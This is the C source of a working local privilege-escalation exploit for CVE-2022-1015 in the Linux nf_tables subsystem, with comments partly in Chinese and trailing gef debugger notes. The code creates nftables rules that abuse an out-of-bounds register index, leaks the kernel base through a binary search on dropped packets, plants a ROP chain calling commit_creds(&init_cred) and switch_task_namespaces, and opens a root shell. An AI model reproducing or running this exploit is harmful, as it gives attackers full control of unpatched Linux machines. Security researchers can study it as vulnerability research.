// gcc -static ./pwn.c ./helpers.c -lmnl -lnftnl -o pwn 
#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "helpers.h"
#define LEAK_BASE_OFFSET 0x9f425d // 0x9ac3ec

struct vuln_expr_params {
    uint32_t min_len;
    uint32_t max_len;
    uint32_t value;
};

void error(char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}
// setup_nftables() —— create table & chain
void setup_nftables(struct mnl_socket* nl, char* table_name, char* base_chain_name, int* seq)
{
    if (create_table(nl, table_name, AF_INET, seq, NULL) == -1) 
        error("Failed creating table");
    printf("[+] Created nft %s\n", table_name);

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;

    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp, seq, NULL))
        error("Failed creating base chain");
    printf("[+] Created base ipv4 chain %s\n", base_chain_name);
}
// calc_vuln_expr_params_div() —— 计算可写的范围, 以及是否能将值 desired 写入到 sreg
static int calc_vuln_expr_params_div(struct vuln_expr_params* result, uint8_t desired, uint32_t min_len, uint32_t max_len, int shift)
{
    uint64_t base_ = (uint64_t)(1) << (32 - shift);
    uint32_t base = (uint32_t)(base_ - 1);

    if (base == 0xffffffff)
        base = 0xfffffffb; // max actual value 

    for (;;) {
        uint64_t computed = (base * 4) & 0xffffffff;
        uint64_t max_value = computed + (uint64_t)(max_len);
        if (max_value < ((uint64_t)(1) << 32)) 
            break;

        if ( (base & 0xff) != desired) {       // 检查能否将值 desired 写入到 sreg
            base--;
            continue;
        }

        uint32_t len_at_least = ((uint64_t)1 << 32) - computed;
        uint32_t len_at_most  = len_at_least + 0x50; 
        
        if (min_len > len_at_least) 
            len_at_least = min_len;

        if (max_len < len_at_most) 
            len_at_most = max_len;

        result->max_len = len_at_most;
        result->min_len = len_at_least;
        result->value = base + 4;
        return 0;
    }
    return -1;
}

static int calc_vuln_expr_params(struct vuln_expr_params *result, uint8_t desired, uint32_t min_len, uint32_t max_len)
{
    for (int i = 0; i < 3; ++i) {   // 不需要循环，乘以4之后结果都一样
        int res = calc_vuln_expr_params_div(result, desired, min_len, max_len, i);
        if (!res)
            return 0;
    }
    return -1;
}
// create_base_chain_rule() —— create rule to get specific packet (specified port & magic value)
#define MAGIC 0xdeadbeef0badc0de
int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);

// 1. 添加rule获取目的端口 (保存到 register 8): UDP header 的目的端口位于偏移2处, 占2字节长
    rule_add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, offsetof(struct udphdr, dest), sizeof(uint16_t), 8);

// 2. 若目标端口不匹配, 则rule会接收该包, 避免 server socket 发包带来的噪声; 
    // 注意: server socket 和 client socket 端在 do_chain() 中的栈结构不同
    uint16_t dest_port = htons(9999);
    rule_add_cmp(r, NFT_CMP_EQ, 8, &dest_port, sizeof dest_port);

// 3. 获取 header 的前8字节，若和 magic 值不匹配, 则rule会接收该包
    // 这样能确保只处理我们想处理的 packet
    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 0, 8, 8);

    uint64_t magic = MAGIC;
    rule_add_cmp(r, NFT_CMP_EQ, 8, &magic, sizeof magic);

// 4. 若 packet 通过这些检查, 则跳转到 auxiliary chain
    rule_add_immediate_verdict(r,  NFT_GOTO, "aux_chain");

    // 将rule提交给内核
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}
// create_infoleak_rule() —— create rule to leak and compare with cmp
int create_infoleak_rule(struct mnl_socket* nl, struct nftnl_rule* r, uint8_t cmp, uint8_t pos, uint16_t family, int* seq, int extraflags)
{
    struct vuln_expr_params vuln_params;

// index 0xff -> offset 0x3fc, leak kernel address
    if (calc_vuln_expr_params(&vuln_params, 0xf5,  0x40, 0x40)) 
        error("Could not find correct params to trigger OOB read.");

// shift by pos*8 -> the first byte of the register will be leaked
    uint32_t shift_amt = (pos * 8);
    // printf("min_len: 0x%x,   value:0x%x\n", vuln_params.min_len, vuln_params.value);
    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, 1, &shift_amt, sizeof shift_amt);
    
// binary search: if the compared value > our supplied value, drop the packet. Else, we accept it.
    rule_add_cmp(r, NFT_CMP_GT, 0x15, &cmp, 1);

    rule_add_immediate_verdict(r, NF_DROP, NULL);

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE | extraflags, family, (void**)&r, seq,
        NULL
    );
}
// do_leak_byte() —— leak 1 byte
#define INFOLEAK_RULE_HANDLE 4
uint8_t do_leak_byte(struct mnl_socket* nl, int client_sock, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, uint8_t pos, int* seq)
{
    uint8_t low = 0;
    uint8_t high = 255;
    uint8_t mid;

    char msg[16] = {};
    char result[16] = {};
    *(uint64_t*)msg = MAGIC;
// 1. binary search
    for (;;) {
        mid = (high + low) / 2;
        printf("bounds (inclusive): [0x%.2hhx, 0x%.2hhx]\n", low, high);

        if (low == high)
            return mid;

// 2. Create a rule that replaces the rule with handle INFOLEAK_RULE_HANDLE 
        struct nftnl_rule* r = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
        nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);         // ???
        
// 3. create_infoleak_rule() —— create rule to leak and compare with mid
        if (create_infoleak_rule(nl, r, mid, pos, NFPROTO_IPV4, seq, NLM_F_REPLACE))
            error("Could not replace infoleak rule");
// 4. trigger the above rule
        sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)addr, sizeof *addr);
// 5. judge the leak value range according to drop/accept the packet
        struct sockaddr_in presumed_server_addr;
        socklen_t presumed_server_addr_len = sizeof presumed_server_addr;

        int nrecv = recvfrom(client_sock, result, sizeof result, 0, (struct sockaddr*)&presumed_server_addr, &presumed_server_addr_len);
        if (!nrecv)
            error("[-] Remote socket closed...");
        else if (nrecv < 0) { 
            // > mid: drop      (In case of timeout, value is greater than `mid`)
            low = mid + 1;
        } else {
            if (strcmp(result, "MSG_OK")) 
                error("[-] Something went wrong...");
            memset(result, 0, sizeof result);
            
            // <= mid: accept
            high = mid;
        }
    }
}
// do_leak() —— leak kernel base
uint32_t do_leak(struct mnl_socket* nl, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, int* seq)
{
    #define CLIENT_HOST "127.0.0.1"
    #define CLIENT_PORT 8888

    int client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    struct sockaddr_in client_addr;
    inet_aton(CLIENT_HOST, &client_addr.sin_addr);
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_family = AF_INET;

    if (bind(client_sock, (struct sockaddr*)&client_addr, sizeof client_addr) < 0) 
        error("client bind");

// 1. set 100ms receive timeout (can probably be lower)
    struct timespec t = {.tv_sec =  0, .tv_nsec = 1000 * 200};
    setsockopt(client_sock, SOL_SOCKET, SO_RCVTIMEO, &t, sizeof t);
// 2. leak 4 bytes 
    uint8_t results[4] = {};
    for (int i = 1; i < 4; ++i) {
        results[i] = do_leak_byte(nl, client_sock, addr, table_name, aux_chain_name, i, seq);
        printf("[+] Leaked byte %i: %.2hhx\n", i, results[i]);
    }
    
    close(client_sock);
    return *(uint32_t*)results;
}
// leak_handler() —— polling to receive packet
int leak_handler(int fd)
{
    char buf[4096] = {};
    char send_back[] = "MSG_OK";
    struct sockaddr_in client_addr = {};
    socklen_t client_addr_size = sizeof client_addr;
    size_t conn_id = 0;

    for (;;) {
        int len = recvfrom(fd, buf, sizeof buf - 1, 0, (struct sockaddr*)&client_addr, &client_addr_size);
        if (len <= 0) 
            error("listener receive failed..\n");
        
        sendto(fd, send_back, sizeof(send_back), 0, (struct sockaddr*)&client_addr, client_addr_size);
    }

    close(fd);
    return 0;
}

void* new_stack;

static int install_rop_chain_rule(struct mnl_socket* nl, uint64_t kernel_base, char* chain, int* seq)
{
// 1. return address is at regs.data[0xca]
    struct vuln_expr_params v;
    if (calc_vuln_expr_params(&v, 0xe6, 0x00, 0xff))        // 0xca -> 0xe6
        error("[-] Cannot find suitable parameters for planting ROP chain.");  
// 2. write ROP chain (in the packet) at (0xca - 4)*4 = 0x318
    struct nftnl_rule* r = build_rule("exploit_table", chain, NFPROTO_IPV4, NULL);
    //nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);
    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);
    
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err)
        error("send_batch_request");
    
    return v.max_len;
}

void trigger_rop(struct mnl_socket* nl, uint64_t kernel_base, struct sockaddr_in* magic_addr, int rop_length)
{
    // Structures in .data
    #define INIT_NSPROXY_OFF 0x186d940          // ffffffff8286d940 D init_nsproxy
    #define INIT_CRED_OFF 0x186db80             // ffffffff8286db80 D init_cred
    // Routines in .text
    #define SWITCH_TASK_NAMESPACES_OFF 0xd12b0  // ffffffff810d12b0 T switch_task_namespaces
    #define COMMIT_CREDS_OFF 0xd2690            // ffffffff810d2690 T commit_creds
    #define BPF_GET_CURRENT_TASK_OFF 0x1ef7e0   // ffffffff811ef7e0 T bpf_get_current_task
    #define __DO_SOFTIRQ_OFF 0x1000000          // ffffffff82000000 T __do_softirq
    // Gadgets
    #define MOV_RDI_RAX_OFF 0x2bfb1 // constraint: rcx==0    // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  
    #define POP_RDI_OFF 0x92100                 // 0xffffffff81092100: pop rdi; ret;
    #define POP_RSI_OFF 0x223e6                 // 0xffffffff810223e6: pop rsi; ret;
    #define POP_RCX_OFF 0x139a3
    #define POP_RAX_OFF 0x64650                 // 0xffffffff81064650: pop rax; ret;
    #define POP_RBP_OFF 0x6ae                   // 0xffffffff810006ae: pop rbp; ret; 
    #define CLI_OFF 0x6a918                     // 0xffffffff8106a918: cli; ret;
    #define SUB_RSP_0x80 0x3809f6           // 0xffffffff813809f6: sub rsp, -0x80; pop rbx; pop rbp; ret;
    #define SUB_RSP_0x80_POP4  0x5f80e0     // 0xffffffff815f80e0: sub rsp, -0x80; pop rbx; pop r12; pop r13; pop rbp; ret;
    #define ADD_RSO_0xC8 0x3bd8b0           // 0xffffffff813bd8b0: add rsp, 0xc8; pop r12; pop rbp; ret; 
    
    #define PUSH_RSP_POP_RBX 0x1402020      // 0xffffffff82402020: push rsp; pop rbx; add al, 0x67; ret; 
    #define SUB_RBX_MOV_RAX_POP2  0x1525e5  // 0xffffffff811525e5 : sub rbx, rax ; mov rax, rbx ; pop rbx ; pop rbp ; ret
    #define PUSH_RAX_POP_RSP 0x64cfea       // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    // Misc.
    #define OLD_TASK_FLAGS_OFF 0x12c1e32 // 0x40010000    0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000

    uint64_t *packet = calloc(1, rop_length + 8);

    packet[0] = 0;  // magic value
    uint64_t* rop = &packet[1];

    // 0xffffffff819d5cda <__netif_receive_skb_one_core+122> ret
    int i = 0;
    printf("rop_length: 0x%x\n", rop_length);
    // #define _rop(x) do { if ((i+1)*8 > rop_length) error("ROP TOO LONG"); rop[i++] = (x); } while (0)
    #define _rop(x)  rop[i++] = (x);
/*
    rop[0] = 0;
    rop[1] = 0;
    rop[2] = kernel_base + POP_RBP_OFF;                 // 0xffffffff810006ae: pop rbp; ret; 
    rop[3] = kernel_base + OLD_TASK_FLAGS_OFF + 0x58;   // 0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000
    rop[4] = kernel_base + __DO_SOFTIRQ_OFF + 418;      // ffffffff82000000 T __do_softirq
    rop[5] = 0;
    rop[6] = 0;
    rop[7] = 0;
    rop[8] = 0;
    rop[9] = 0;
    rop[10] = 0;
    rop[11] = 0;
    rop[12] = 0;
    rop[13] = 0;

    rop[14] = kernel_base + CLI_OFF;                    // 0xffffffff8106a918: cli; ret;
    rop[15] = kernel_base + SUB_RSP_0x80;               // 0xffffffff813809f6: sub rsp, -0x80; pop rbx; pop rbp; ret;
    rop[16] = 0;

    // switch_task_namespaces(current, &init_nsproxy)
    i = 17;
    rop[i++] = kernel_base + BPF_GET_CURRENT_TASK_OFF;  // ffffffff811ef7e0 T bpf_get_current_task
    rop[i++] = kernel_base + MOV_RDI_RAX_OFF;           // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = kernel_base + POP_RSI_OFF;               // 0xffffffff810223e6: pop rsi; ret;
    rop[i++] = kernel_base + INIT_NSPROXY_OFF;          // ffffffff8286d940 D init_nsproxy
    rop[i++] = kernel_base + SWITCH_TASK_NAMESPACES_OFF;// ffffffff810d12b0 T switch_task_namespaces
    // commit_cred(&init_cred)
    rop[i++] = kernel_base + POP_RDI_OFF;               // 0xffffffff81092100: pop rdi; ret;
    rop[i++] = kernel_base + INIT_CRED_OFF;             // ffffffff8286db80 D init_cred
    rop[i++] = kernel_base + COMMIT_CREDS_OFF;          // ffffffff810d2690 T commit_creds

    rop[i++] = kernel_base + ADD_RSO_0xC8;              // 0xffffffff813bd8b0: add rsp, 0xc8; pop r12; pop rbp; ret; 
*/

    // clear interrupts
    _rop(kernel_base + CLI_OFF);                        // 0xffffffff8106a918: cli; ret;

    // make rbp-0x58 point to 0x40010000
    _rop(kernel_base + POP_RBP_OFF);                    // 0xffffffff810006ae: pop rbp; ret; 
    _rop(kernel_base + OLD_TASK_FLAGS_OFF + 0x58);      // 0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000
    
    // Cleanly exit softirq and return to syscall context 
    _rop(kernel_base + __DO_SOFTIRQ_OFF + 418);         // ffffffff82000000 T __do_softirq
    
// j1: stack frame was 0x60 bytes  —— use 12 ROP to fill
    //for (int j = 0; j < 12; ++j) _rop(0);

    // switch_task_namespaces(current, &init_nsproxy)
    _rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);       // ffffffff811ef7e0 T bpf_get_current_task
    _rop(kernel_base + MOV_RDI_RAX_OFF);                // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  
    _rop(0xdeadbeef);
    _rop(0xdeadbeef);
    _rop(kernel_base + POP_RSI_OFF);                    // 0xffffffff810223e6: pop rsi; ret;
    _rop(kernel_base + INIT_NSPROXY_OFF);               // ffffffff8286d940 D init_nsproxy
    _rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);     // ffffffff810d12b0 T switch_task_namespaces

    // commit_cred(&init_cred)
    _rop(kernel_base + POP_RDI_OFF);        // 0xffffffff81092100: pop rdi; ret;
    _rop(kernel_base + INIT_CRED_OFF);      // ffffffff8286db80 D init_cred
    _rop(kernel_base + COMMIT_CREDS_OFF);   // ffffffff810d2690 T commit_creds

    // pass control to system call stack
    // this is offset +0x70 from our rop chain
    // target is at   +0x168
    _rop(kernel_base + 0x145af2);  // 0xffffffff81145af2: add rsp, 0xd8; pop rbx; pop r12; pop rbp; ret;
    _rop(0xdeadbeef);                       // #12 ROP

// jump to j1
    _rop(kernel_base + 0x21638);      // 0xffffffff81021638 : push rsp ; add eax, 0xc031000b ; pop rbp ; ret
    _rop(kernel_base + 0x45c7c7);     // 0xffffffff8145c7c7 : push rbp ; pop rax ; fcos ; pop rbp ; ret
    _rop(0xdeadbeef);
    _rop(kernel_base + 0x55aba2);     // 0xffffffff8155aba2 : pop r8 ; ret
    _rop(0x70);
    _rop(kernel_base + 0x152428);     // 0xffffffff81152428 : sub rax, r8 ; ret
    _rop(kernel_base + 0x64cfea);     // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;

    /*
    _rop(kernel_base + 0x143fd36);                   // 0xffffffff8243fd36: push rsp; pop rdi; mov ebp, 0x68d9f4d3; ret;   不可执行!!!!!
    _rop(kernel_base + 0x223e6);                     // 0xffffffff810223e6: pop rsi; ret;
    _rop(0x60+0x10+0x10 - 0x30);
    _rop(kernel_base + 0x990dab);                   // 0xffffffff81990dab : sub rdi, rsi ; pop rbp ; lea rax, [rdi - 0x30] ; ret
    _rop(0xdeadbeef);
    _rop(kernel_base + 0x64cfea);                         // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    */

    //_rop(kernel_base + SUB_RSP_0x80_POP4);              // 0xffffffff815f80e0: sub rsp, -0x80; pop rbx; pop r12; pop r13; pop rbp; ret;
    /*
    _rop(kernel_base + PUSH_RSP_POP_RBX);                // 0xffffffff82402020: push rsp; pop rbx; add al, 0x67; ret;      不可执行!!!!!
    _rop(kernel_base + POP_RAX_OFF);                     // 0xffffffff81064650: pop rax; ret;
    _rop(0x60+0x10+0x10);
    _rop(kernel_base + SUB_RBX_MOV_RAX_POP2);            // 0xffffffff811525e5 : sub rbx, rax ; mov rax, rbx ; pop rbx ; pop rbp ; ret
    _rop(0xdeadbeef);
    _rop(0xdeadbeef);
    _rop(kernel_base + PUSH_RAX_POP_RSP);                              // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    */
    // We're already on 128 bytes here 


    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    puts("Triggering payload..");
    sendto(s, packet, rop_length + 8, 0, (struct sockaddr*)magic_addr, sizeof *magic_addr);
}

int main(int argc, char** argv, char** envp)
{
// 1. initialize
// 1-1. unshare - namespace
    if (argc < 2) {
        puts("[+] Dropping into network namespace");
        
        // We're too lazy to perform uid mapping and such.
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        exit(EXIT_FAILURE);
    }

    // I'm too lazy to talk to NETLINK_ROUTE..
    system("ip link set dev lo up");
// 1-2. setup netlink & nftables
    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("[-] mnl_socket_bind");
        puts("[-] Are you sure you have CAP_NET_ADMIN?..");
        exit(EXIT_FAILURE);
    }
    int seq = time(NULL);
    int err;
// 1-3. create rule to get specific packet (specified port 9999 & MAGIC value)
    char *table_name = "exploit_table", *base_chain_name = "base_chain", *aux_chain_name = "aux_chain";
    // create base_chain
    setup_nftables(nl, table_name, base_chain_name, &seq);
    // create auxilitary chain
    if (create_chain(nl, table_name, aux_chain_name, NFPROTO_IPV4, NULL, &seq, NULL)) 
        error("Failed creating auxiliary chain");
    printf("[+] Created auxiliary chain %s\n", aux_chain_name);
    // base_chain rule
    if (create_base_chain_rule(nl, table_name, base_chain_name, NFPROTO_IPV4, NULL, &seq)) 
        error("Failed creating base chain rule");
    puts("[+] Created base chain rule");
// 2. test if the kernel is vulnerable
// make a rule (latter use leak rule to replace it)   
    struct vuln_expr_params v;

// 2-1. offset 0xca and len 0xff is OOB (0xca * 4 = 0x328 ret_addr offset)  calculate overflow range
    if (calc_vuln_expr_params(&v, 0xca, 0x00, 0xff))
        error("[-] Something went horribly wrong...");
// 2-2. 创建rule: 把 packet 中 8~max_len 字节读取到偏移寄存器 (v.value-4)*4 处 (往栈上写数据)
    struct nftnl_rule* aux_rule = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
    rule_add_payload(aux_rule, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);

    err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&aux_rule, &seq,
        NULL
    );
    if (err) // 如果能成功创建rule, 说明越界的值 v.value 能够传递到内核, 存在漏洞
        error("[-] TARGET IS NOT VULNERABLE to CVE-2022-1015!");

    puts("[+] Succesfully created rule with OOB nft_payload!");
    puts(CLR_GRN "[+] TARGET IS VULNERABLE to CVE-2022-1015!" CLR_RESET);
// 3. leak kernel base
// 3-1. setup listening process to receive packet
    #define SERVER_HOST "127.0.0.1"
    #define SERVER_PORT 9999
    int pid = setup_listener(SERVER_HOST, SERVER_PORT, leak_handler);  // leak_handler() —— polling to receive packet
// 3-2. leak kernel base    
    struct sockaddr_in server;
    inet_aton(SERVER_HOST, &server.sin_addr);
    server.sin_port = htons(SERVER_PORT);
    server.sin_family = AF_INET;

    uint32_t leak = do_leak(nl, &server, table_name, aux_chain_name, &seq);
    // first byte might fail due to buggy carry implementation with shift_amt = 0
    // so we just set it. The LSB will always remain constant.
    uint64_t kernel_addr = 0xffffffff00000000 + leak + (LEAK_BASE_OFFSET & 0xff);
    printf("Leaked address: 0x%lx\n", kernel_addr);
    uint64_t kernel_base = kernel_addr - LEAK_BASE_OFFSET;
    if ((kernel_base & 0xfffff) != 0) {
        puts("[-] Leak failed.");
        puts("[-] Try changing offsets / lengths / chain types.");
        error("[-] If all leaked bytes were ff, this is probably because of corrupted loopback state.. RIP");
    }

    printf("[+] Kernel base @ 0x%.16lx\n", kernel_base);
    stop_listener(pid);
    // int x;
    // scanf("%d", &x);
// 4. write ROP chain (from packet) at the ret_addr
    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_IN;
    bp.prio = 10;
    if (create_chain(nl, table_name, "base_chain_2", NFPROTO_IPV4, &bp, &seq, NULL)) 
        error("Failed adding second base chain");

    err = install_rop_chain_rule(nl, kernel_base, "base_chain_2", &seq);
    if (err < 0) 
        error("[-] Could not install ROP chain");
// 5. send packet to trigger rop chain
    new_stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) + 0x3ff0;
    trigger_rop(nl, kernel_base, &server, err);

    system("id");
    system("sh");  
}






/*
void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}
unshare_setup(getuid(), getgid());


nft_do_chain()
	for (; rule < last_rule; rule = nft_rule_next(rule)) {
		nft_rule_dp_for_each_expr(expr, last, rule) {
			if (expr->ops == &nft_cmp_fast_ops)                 b net/netfilter/nf_tables_core.c:226
            ...
    				expr_call_ops_eval(expr, &regs, pkt);       b net/netfilter/nf_tables_core.c:232

(1) the offset of kernel_address

暂停在 nft_do_chain() 函数中
gef➤  p &regs
$1 = (struct nft_regs *) 0xffffc900007af890
gef➤  x /20xg 0xffffc900007af890+0x3c0
0xffffc900007afc50:	0x0000000000000000	0xffffffff81aebe20
0xffffc900007afc60:	0xffff00110f27fc90	0x0000000000000000
0xffffc900007afc70:	0x0000000000000000	0x0000000000000000
0xffffc900007afc80:	0x000000000100007f	0x0000000000000000
0xffffc900007afc90:	0x00000000ffff0000	0xffffffff819f425d
0xffffc900007afca0:	0x0000000100000001	0x0011000000000000
gef➤  x /bx 0xffffffff81aebe20
0xffffffff81aebe20 <ip_generic_getfrag>:	0x0f
gef➤  x /bx 0xffffffff819f425d
0xffffffff819f425d <move_addr_to_user+77>:	0x89

0x48  vs 0x70   原来的exp中泄露的是 0x370+0x70 处的地址，现在这个内核版本，需泄露 0x370+0x48 处的地址, 所以 create_infoleak_rule() 中传入的值为 0xff - 0x28 / 4 = 0xf5


(2) the offset of ret address
注意断点一定要下在 nft_payload 指令执行之前，不然栈上已经拷贝好了伪造的数据
    b net/netfilter/nf_tables_core.c:226

gef➤  p &regs                                                      这里是 base_chain 并非拷贝ROP时的栈情况
$3 = (struct nft_regs *) 0xffffc90000487890
gef➤  x /40xg 0xffffc90000487890+0x300
0xffffc90000487b90:	0xffff8881020c8000	0xffffc90000487bb0
0xffffc90000487ba0:	0xffffffff81aefb09	0x0000000000000011
0xffffc90000487bb0:	0xffffc90000487bf0	0xffffffff81b26b23
0xffffc90000487bc0:	0xffffc90000487d90	0x0000000000000000
0xffffc90000487bd0:	0xffff8881020c8000	0xffffc90000487e10
0xffffc90000487be0:	0x0000000000000107	0xffffc90000487ca0
0xffffc90000487bf0:	0xffffc90000487d90	0xffffffff81b27973
0xffffc90000487c00:	0x0000000000000000	0xffffc90000487c18
0xffffc90000487c10:	0xbfd42cfaddf4e900	0x0000000000000107
0xffffc90000487c20:	0x0000000000000000	0x000000000100007f
0xffffc90000487c30:	0x0000000000000000	0xffff88810100007f
0xffffc90000487c40:	0xffffc90000487c70	0xffff8881020c8370
0xffffc90000487c50:	0xffffffff00000000	0xffffffff81aebe20
0xffffc90000487c60:	0xffff00110f279f10	0x0000000000000000
0xffffc90000487c70:	0x0000000000000000	0x0000000000000000
0xffffc90000487c80:	0x000000000100007f	0x0000000000000000
0xffffc90000487c90:	0x00000000ffff0000	0xffff8881020c8098
0xffffc90000487ca0:	0x0000000100000001	0x0011000000000000
0xffffc90000487cb0:	0x000003e800000000	0x0000000000000000
0xffffc90000487cc0:	0xffffffff00000000	0x0100007f0100007f
gef➤  x /bx 0xffffffff81aefb09
0xffffffff81aefb09 <ip_send_skb+25>:	0x85
gef➤  x /bx 0xffffffff81b26b23
0xffffffff81b26b23 <udp_send_skb+355>:	0x85
gef➤  x /bx 0xffffffff81b27973
0xffffffff81b27973 <udp_sendmsg+2995>:	0x4c
gef➤  x /bx 0xffffffff81aebe20
0xffffffff81aebe20 <ip_generic_getfrag>:	0x0f

gef➤  p &regs                                                  这里才是 base_chain_2 负责溢出覆盖栈数据
$6 = (struct nft_regs *) 0xffffc9000006b9c8
gef➤  x /40xg 0xffffc9000006b9c8+0x300
0xffffc9000006bcc8:	0xffffffff81ae8cd3	0x0000000000000246
0xffffc9000006bcd8:	0xffffc9000006bd00	0xffffffff8114de4e
0xffffc9000006bce8:	0x0000000000000000	0x0000000000000000
0xffffc9000006bcf8:	0x0cb540aaa615d100	0xffff88813bc32410
0xffffc9000006bd08:	0x0cb540aaa615d100	0xffff88813bc32410
0xffffc9000006bd18:	0xffff888101d47000	0x0000000000000001
0xffffc9000006bd28:	0xffffc9000006bd58	0xffffffff81a20248
0xffffc9000006bd38:	0xffff88810215c700	0xffffffff82b8b060
0xffffc9000006bd48:	0x0cb540aaa615d100	0xffff88810215c700
0xffffc9000006bd58:	0xffffc9000006bd78	0xffffffff81a202a5      <---------------
0xffffc9000006bd68:	0xffff88813bc32410	0xffff88810215c700
0xffffc9000006bd78:	0xffffc9000006bdb8	0xffffffff81a20519
0xffffc9000006bd88:	0xffff88813bc3250c	0xffffc9000006be07
0xffffc9000006bd98:	0xffff88813bc32510	0x0000000000000000
0xffffc9000006bda8:	0x0000000000000040	0xffffc9000006be18
0xffffc9000006bdb8:	0xffffc9000006bde8	0xffffffff81a21291
0xffffc9000006bdc8:	0xffff88813bc32510	0x000000000000012c
0xffffc9000006bdd8:	0xffffc9000006be08	0xffff88813bc32400
0xffffc9000006bde8:	0xffffc9000006be58	0xffffffff81a21762
0xffffc9000006bdf8:	0x00000000ffff1583	0x00ffc9000006be48
gef➤  x /bx 0xffffffff81ae8cd3
0xffffffff81ae8cd3 <ip_rcv+83>:	0x48
gef➤  x /bx 0xffffffff8114de4e
0xffffffff8114de4e <ktime_get+62>:	0x48
gef➤  x /bx 0xffffffff81a20248
0xffffffff81a20248 <__netif_receive_skb_one_core+136>:	0xeb
gef➤  x /bx 0xffffffff82b8b060
0xffffffff82b8b060 <ip_packet_type>:	0x08
gef➤  x /bx 0xffffffff81a202a5
0xffffffff81a202a5 <__netif_receive_skb+21>:	0x5b            <-------------- 待篡改的地址
gef➤  x /bx 0xffffffff81a20519
0xffffffff81a20519 <process_backlog+169>:	0xe8
gef➤  x /bx 0xffffffff81a21291
0xffffffff81a21291 <__napi_poll+49>:	0x41
gef➤  x /bx 0xffffffff81a21762
0xffffffff81a21762 <net_rx_action+546>:	0x80

0x398 vs 0x328   原来的exp劫持的是 0x328 处的函数地址，现在需劫持 0x398 处的函数地址, install_rop_chain_rule() 中 写入位置变为 0xca + 0x70/4 = 0xe6


// (3) 构造ROP

gef➤  find 0xffffffff81000000, 0xffffffff83000000, "\x00\x00\x01\x40\x00\x00\x00\x00"
0xffffffff822c1e32 <serial_pci_tbl+4850>
0xffffffff82af0fe8 <efifb_dmi_list+72>
0xffffffff82af10a8 <efifb_dmi_list+264>
3 patterns found.
